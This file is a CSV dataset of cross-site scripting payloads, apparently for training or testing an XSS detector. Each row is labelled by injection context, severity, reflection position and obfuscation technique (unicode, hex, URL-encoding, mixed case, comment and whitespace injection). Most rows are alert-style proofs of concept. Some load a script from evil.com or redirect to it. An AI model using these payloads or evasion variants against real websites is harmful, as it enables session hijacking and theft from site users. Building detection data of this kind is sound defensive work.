payload,payload_with_context,context,severity,source,sink,reflection_position,technique
javascript:confirm(1),javascript:confirm(1) [position:style],js_uri,medium,,,style,mutated
<img src=x onerror=\u0061\u006cert(1)>,<img src=x onerror=\u0061\u006cert(1)> [position:attribute],event_handler,high,,,attribute,obfuscated:unicode_escape
<img src/onerror=prompt(8)>,<img src/onerror=prompt(8)> [position:dom],html_body,medium,,,dom,none
"setTimeout(	""alert(	1)"",0)","setTimeout(	""alert(	1)"",0) [position:script]",dom_sink,low,,,script,obfuscated:tab_newline_inject
<script>confirm(1)</script>,<script>confirm(1)</script> [position:script],script_injection,medium,,,script,mutated
javascript:confirm(1),javascript:confirm(1) [position:style],js_uri,high,,,style,original
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:attribute],attribute,low,,,attribute,obfuscated:url_encode
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:script]",dom_sink,low,,,script,original
\x3cimg src=x onerror=alert(1)\x3e,\x3cimg src=x onerror=alert(1)\x3e [position:attribute],template_injection,medium,,,attribute,obfuscated:hex_escape
\' onerror=alert(1)//,\' onerror=alert(1)// [position:html_body],template_injection,high,,,html_body,original
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:html_body]",template_injection,medium,,,html_body,obfuscated:url_encode
"""><img src=x onerror=confirm(1)>","""><img src=x onerror=confirm(1)> [position:attribute]",attribute,high,,,attribute,mutated
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:style]",template_injection,low,,,style,mutated
"eVaL(""aLeRt(1)"")","eVaL(""aLeRt(1)"") [position:script]",dom_sink,high,,,script,obfuscated:mixed_case
\x3cscript\x3econfirm(1)\x3c/script\x3e,\x3cscript\x3econfirm(1)\x3c/script\x3e [position:script],script_injection,low,,,script,obfuscated:hex_escape
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute,low,,,attribute,original
%3Cimg/src=x onerror=alert(1)//%3E,%3Cimg/src=x onerror=alert(1)//%3E [position:attribute],event_handler,low,,,attribute,obfuscated:url_encode
"<img src
=x onerror
=alert(	1)>","<img src
=x onerror
=alert(	1)> [position:script]",script_injection,high,,,script,obfuscated:tab_newline_inject
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:script]",template_injection,low,,,script,original
\' onload=alert(1)//,\' onload=alert(1)// [position:attribute],event_handler,low,,,attribute,mutated
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>","data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt> [position:html_body]",js_uri,high,,,html_body,obfuscated:comment_inject
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],tag_injection,high,,,script,mutated
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:html_body],script_injection,high,,,html_body,original
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",dom_sink,high,,,script,original
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:style],event_handler,high,,,style,original
' ><img src=x onerror=alert(1)>,' ><img src=x onerror=alert(1)> [position:html_body],tag_injection,high,,,html_body,original
<script>confirm(1)</script>,<script>confirm(1)</script> [position:html_body],script_injection,high,,,html_body,mutated
<img src=x onerror=\u0061\u006cert(1)>,<img src=x onerror=\u0061\u006cert(1)> [position:html_body],tag_injection,medium,,,html_body,obfuscated:unicode_escape
"document.body.innerHTML=""<svg src=x onerror=alert(1)>""","document.body.innerHTML=""<svg src=x onerror=alert(1)>"" [position:script]",dom_sink,low,,,script,mutated
<script>confirm(1)</script>,<script>confirm(1)</script> [position:script],script_injection,high,,,script,mutated
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:script],event_handler,low,,,script,mutated
<script>confirm(1)</script>,<script>confirm(1)</script> [position:html_body],tag_injection,low,,,html_body,mutated
<script>\u0061\u006cert(document.dom\u0061in)</script>,<script>\u0061\u006cert(document.dom\u0061in)</script> [position:script],script_injection,low,,,script,obfuscated:unicode_escape
\' onerror=alert(1)//,\' onerror=alert(1)// [position:script],attribute_escape,high,,,script,mutated
"<iframe src=""javascr/**/ipt:alert(1)"">","<iframe src=""javascr/**/ipt:alert(1)""> [position:script]",tag_injection,medium,,,script,obfuscated:comment_inject
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:html_body]",attribute_escape,low,,,html_body,original
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:script],script_injection,high,,,script,mutated
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:script],script_injection,medium,,,script,original
"onload=""alert(1)""","onload=""alert(1)"" [position:html_body]",html_body,medium,,,html_body,none
\' onerror=alert(1)//,\' onerror=alert(1)// [position:script],attribute_escape,low,,,script,mutated
<svg onload=alert(1)>,<svg onload=alert(1)> [position:none],event_handler,high,,,none,original
' onerror=\u0061\u006cert(1) x=',' onerror=\u0061\u006cert(1) x=' [position:attribute],attribute,low,,,attribute,obfuscated:unicode_escape
"%3Cembed src=""javascript:alert(1)""%3E","%3Cembed src=""javascript:alert(1)""%3E [position:html_body]",tag_injection,high,,,html_body,obfuscated:url_encode
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:attribute]",attribute_escape,low,,,attribute,original
<svg onload=alert()>,<svg onload=alert()> [position:html_body],html_body,medium,,,html_body,none
"document.write(""<img src=x onerror=alert(1)>"")","document.write(""<img src=x onerror=alert(1)>"") [position:html_body]",script_injection,high,,,html_body,original
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:style]",event_handler,low,,,style,original
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:attribute],attribute_escape,high,,,attribute,mutated
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:html_body]",tag_injection,high,,,html_body,original
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:script],js_uri,medium,,,script,original
<scr/**/ipt>prompt(1)</scr/**/ipt>,<scr/**/ipt>prompt(1)</scr/**/ipt> [position:attribute],attribute,medium,,,attribute,obfuscated:comment_inject
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:attribute]",attribute,low,,,attribute,original
"document.write(""<img src=x onerror=alert(1)>"")","document.write(""<img src=x onerror=alert(1)>"") [position:none]",dom_sink,low,,,none,original
"document.write(""<img src=x onerror=alert(1)>"")","document.write(""<img src=x onerror=alert(1)>"") [position:script]",dom_sink,high,,,script,original
#{aLeRt(1)},#{aLeRt(1)} [position:attribute],template_injection,low,,,attribute,obfuscated:mixed_case
#{alert(1)},#{alert(1)} [position:attribute],template_injection,high,,,attribute,mutated
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:none],dom_sink,high,,,none,original
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:attribute]",attribute,high,,,attribute,obfuscated:url_encode
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",dom_sink,medium,,,script,mutated
<%00script>d.innerHTML+='';</script>,<%00script>d.innerHTML+='';</script> [position:html_body],html_body,high,,,html_body,mutated
<script>confirm(document.domain)</script>,<script>confirm(document.domain)</script> [position:script],template_injection,medium,,,script,mutated
<svg/onload=confirm(1)>,<svg/onload=confirm(1)> [position:script],tag_injection,high,,,script,mutated
' onerror=\u0061\u006cert(1) x=',' onerror=\u0061\u006cert(1) x=' [position:attribute],attribute,high,,,attribute,obfuscated:unicode_escape
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:script]",tag_injection,high,,,script,original
\' onerror=alert(1)//,\' onerror=alert(1)// [position:none],attribute_escape,low,,,none,obfuscated:hex_escape
"<svg/onload
=alert(	1)>","<svg/onload
=alert(	1)> [position:html_body]",js_uri,medium,,,html_body,obfuscated:tab_newline_inject
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:script]",js_uri,high,,,script,obfuscated:html_entity
\' onerror=alert(1)//,\' onerror=alert(1)// [position:script],attribute_escape,low,,,script,original
${alert(	1)},${alert(	1)} [position:none],template_injection,medium,,,none,obfuscated:tab_newline_inject
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:html_body],tag_injection,medium,,,html_body,mutated
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:html_body],js_uri,low,,,html_body,original
""" onload=al'+'ert(1) x=""",""" onload=al'+'ert(1) x="" [position:attribute]",attribute,high,,,attribute,obfuscated:concat_split
<%= alert(1) %>,<%= alert(1) %> [position:script],tag_injection,medium,,,script,mutated
\x3cscript\x3ealert(1)\x3c/script\x3e,\x3cscript\x3ealert(1)\x3c/script\x3e [position:none],template_injection,low,,,none,obfuscated:hex_escape
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:none],event_handler,low,,,none,original
{{7*7}},{{7*7}} [position:none],js_uri,high,,,none,original
"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">","<EmBeD SrC=""jAvAsCrIpT:AlErT(1)""> [position:script]",tag_injection,high,,,script,obfuscated:mixed_case
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:html_body]",tag_injection,high,,,html_body,original
\' onerror=alert(1)//,\' onerror=alert(1)// [position:html_body],attribute_escape,high,,,html_body,original
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",dom_sink,low,,,script,obfuscated:comment_inject
<SCRIPT>alert(1)</SCRIPT>,<SCRIPT>alert(1)</SCRIPT> [position:html_body],script_injection,medium,,,html_body,mutated
<script>alert(1)</script>,<script>alert(1)</script> [position:html_body],script_injection,high,,,html_body,original
onload='window.alert(1)',onload='window.alert(1)' [position:html_body],html_body,medium,,,html_body,mutated
javascr/**/ipt:confirm(1),javascr/**/ipt:confirm(1) [position:script],js_uri,low,,,script,obfuscated:comment_inject
"{{constructor.constructor(""confirm(1)"")()}}","{{constructor.constructor(""confirm(1)"")()}} [position:none]",template_injection,medium,,,none,mutated
<body onload=alert(1)>,<body onload=alert(1)> [position:style],event_handler,medium,,,style,original
javascript:confirm(1),javascript:confirm(1) [position:style],js_uri,low,,,style,mutated
"document.body.innerHTML=""<img src=x onerror=alert(1)>""","document.body.innerHTML=""<img src=x onerror=alert(1)>"" [position:style]",template_injection,high,,,style,mutated
<svg onload=alert(1)>,<svg onload=alert(1)> [position:none],event_handler,high,,,none,mutated
\x3cbody onload=alert(1)\x3e,\x3cbody onload=alert(1)\x3e [position:style],attribute_escape,low,,,style,obfuscated:hex_escape
"""\x3e\x3cimg src=x onerror=alert(1)\x3e","""\x3e\x3cimg src=x onerror=alert(1)\x3e [position:attribute]",attribute,low,,,attribute,obfuscated:hex_escape
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],js_uri,low,,,script,original
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,high,,,attribute,mutated
"document.body.innerHTML=""<img src=x onload=alert(1)>""","document.body.innerHTML=""<img src=x onload=alert(1)>"" [position:script]",dom_sink,low,,,script,mutated
""" onerror
=alert(	1) x
=""",""" onerror
=alert(	1) x
="" [position:attribute]",attribute,low,,,attribute,obfuscated:tab_newline_inject
"document.write(""<img src=x onerror=alert(1)>"")","document.write(""<img src=x onerror=alert(1)>"") [position:none]",template_injection,high,,,none,mutated
"document.write(""<img src=x onerror=al'+'ert(1)>"")","document.write(""<img src=x onerror=al'+'ert(1)>"") [position:script]",dom_sink,high,,,script,obfuscated:concat_split
<script>confirm(1)</script>,<script>confirm(1)</script> [position:script],template_injection,medium,,,script,mutated
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:none]",dom_sink,high,,,none,original
' oNmOuSeOvEr=aLeRt(1) ',' oNmOuSeOvEr=aLeRt(1) ' [position:attribute],attribute,medium,,,attribute,obfuscated:mixed_case
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:attribute]",js_uri,medium,,,attribute,original
"""\x3e\x3cimg src=x onerror=alert(1)\x3e","""\x3e\x3cimg src=x onerror=alert(1)\x3e [position:attribute]",attribute,low,,,attribute,obfuscated:hex_escape
"{{cOnStRuCtOr.cOnStRuCtOr(""AlErT(1)"")()}}","{{cOnStRuCtOr.cOnStRuCtOr(""AlErT(1)"")()}} [position:html_body]",template_injection,low,,,html_body,obfuscated:mixed_case
"{{constructor.constructor(""confirm(1)"")()}}","{{constructor.constructor(""confirm(1)"")()}} [position:attribute]",template_injection,high,,,attribute,mutated
"onerror=""alert(1)""","onerror=""alert(1)"" [position:html_body]",html_body,medium,,,html_body,none
<script>confirm(1)</script>,<script>confirm(1)</script> [position:script],script_injection,medium,,,script,original
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:html_body],tag_injection,high,,,html_body,obfuscated:comment_inject
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:script]",template_injection,low,,,script,mutated
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:html_body],script_injection,high,,,html_body,obfuscated:comment_inject
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,<svg/on\u006co\u0061d=\u0061\u006cert(1)> [position:none],dom_sink,medium,,,none,obfuscated:unicode_escape
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:attribute]",attribute,high,,,attribute,obfuscated:comment_inject
<svg onload=alert(1)>,<svg onload=alert(1)> [position:script],event_handler,high,,,script,mutated
<body onload=alert(1)>,<body onload=alert(1)> [position:attribute],event_handler,medium,,,attribute,mutated
\' onerror=alert(1)//,\' onerror=alert(1)// [position:script],dom_sink,high,,,script,original
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:script]",dom_sink,low,,,script,mutated
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,low,,,attribute,obfuscated:html_entity
<svg/onload=prompt`1`)>,<svg/onload=prompt`1`)> [position:dom],html_body,high,,,dom,mutated
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:html_body]",attribute_escape,low,,,html_body,original
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,medium,,,attribute,obfuscated:hex_escape
<%= alert(1) %>,<%= alert(1) %> [position:style],template_injection,low,,,style,mutated
' onerror=confirm(1) x=',' onerror=confirm(1) x=' [position:attribute],attribute,high,,,attribute,mutated
\' onerror=alert(1)//,\' onerror=alert(1)// [position:none],attribute_escape,high,,,none,original
"data:text/html,<script>alert(1)</script>","data:text/html,<script>alert(1)</script> [position:html_body]",js_uri,low,,,html_body,mutated
\' onload=alert(1)//,\' onload=alert(1)// [position:script],dom_sink,medium,,,script,mutated
' ><img src=x onerror=alert(1)>,' ><img src=x onerror=alert(1)> [position:attribute],attribute,high,,,attribute,original
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:html_body],tag_injection,low,,,html_body,mutated
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:html_body],tag_injection,medium,,,html_body,original
<%= alert(1) %>,<%= alert(1) %> [position:style],template_injection,low,,,style,mutated
